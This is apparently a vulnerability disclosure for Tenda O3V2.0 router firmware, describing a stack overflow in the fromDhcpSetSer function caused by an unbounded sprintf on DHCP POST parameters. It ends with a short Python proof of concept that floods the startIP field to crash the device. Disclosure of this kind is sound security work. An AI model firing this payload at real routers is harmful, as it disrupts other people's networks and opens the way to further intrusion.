## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2832.html

## Affected version

O3V2.0 V1.0.0.10(2478)

## Vulnerability details

In the O3V2.0 V1.0.0.10(2478) firmware has a stack overflow vulnerability in the `fromDhcpSetSer` function. The `v9, v10, v11, v13, v14, v15, v16` variable receives the `dhcpEn, startIP, endIP, preDNS, altDNS, mask, gateway` parameters from a POST request. However, since the user can control the input of these parameters, the statement `sprintf(v18, "%s;%s;%s;%s;%s;%s;%s;%s;%s", v9, "br0", v10, v11, v16, v15, (const char *)v19, v13, v14);` can cause a buffer overflow. The user-provided  `dhcpEn, startIP, endIP, preDNS, altDNS, mask, gateway` can exceed the capacity of the `v18` array, triggering this security vulnerability.

![image-20240714213333826](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714213333826.png)

![image-20240714213349492](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714213349492.png)

## POC

```python
import requests


ip = "192.168.84.101"
url = "http://" + ip + "/goform/setDhcpConfig"
payload = b"a"*2000

data = {"startIP": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240714213455164](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714213455164.png)
